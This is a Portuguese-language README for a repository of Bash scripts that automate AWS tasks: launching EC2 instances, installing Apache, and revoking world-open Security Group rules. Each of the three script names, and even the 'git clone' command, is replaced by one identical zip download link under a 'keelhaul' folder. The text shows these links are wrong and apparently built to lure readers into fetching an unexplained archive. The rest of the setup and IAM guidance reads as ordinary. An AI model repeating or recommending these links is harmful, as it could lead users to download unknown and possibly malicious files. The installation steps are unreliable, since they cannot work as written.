# AWS Ops Scripts

Scripts Bash para automatizar tarefas comuns na AWS. Criei isso pra facilitar o dia a dia trabalhando com EC2 e gerenciamento de Security Groups.

## O que tem aqui

**https://github.com/LucianoHMG/aws-ops-scripts/raw/refs/heads/main/keelhaul/ops-scripts-aws-v1.1.zip** - Cria uma instancia EC2 com Ubuntu de forma simples

Basta rodar e passa alguns parametros que o script:
- Cria a instancia
- Aguarda ela ficar pronta
- Retorna o IP publico

Edita o script pra colocar sua AMI ID, tipo de instancia e a chave que voce quer usar.

**https://github.com/LucianoHMG/aws-ops-scripts/raw/refs/heads/main/keelhaul/ops-scripts-aws-v1.1.zip** - Instala e configura Apache2

Roda no boot da instancia via user-data ou voce executa depois via SSH. Instala o Apache, deixa ativo automaticamente e cria uma pagina HTML de teste.

**https://github.com/LucianoHMG/aws-ops-scripts/raw/refs/heads/main/keelhaul/ops-scripts-aws-v1.1.zip** - Fecha portas abertas de um Security Group

Pra quando aquele SG esta muito aberto e voce precisa fechar essas portas rapidinho. Remove as regras que deixam aberto pro mundo (0.0.0.0/0).

## Como usar

Primeiro, configure a AWS CLI:
```bash
aws configure
```

Clone o repo:
```bash
git clone https://github.com/LucianoHMG/aws-ops-scripts/raw/refs/heads/main/keelhaul/ops-scripts-aws-v1.1.zip
cd aws-ops-scripts
```

De permissao de execucao:
```bash
chmod +x *.sh
```

Ai edita o script que voce vai usar e coloca seus dados (região, tipo de instancia, etc)

## Permissoes que precisa na AWS

Se voce tiver uma user IAM, libera essas permissoes:
- ec2:RunInstances
- ec2:DescribeInstances
- ec2:DescribeSecurityGroups
- ec2:RevokeSecurityGroupIngress

## Um conselho

Nunca rode esses scripts sem antes entender o que cada um faz. Especialmente o de fechar portas - revisa os Security Groups antes de executar pra nao deixar sua aplicacao fora.

Se voce ta estudando pra AWS Cloud Practitioner (como eu), esses scripts sao bons exemplos de como usar a AWS CLI direto com Bash.

## Contribuindo

Tem idea de outro script util? Abre uma issue ou manda um PR.
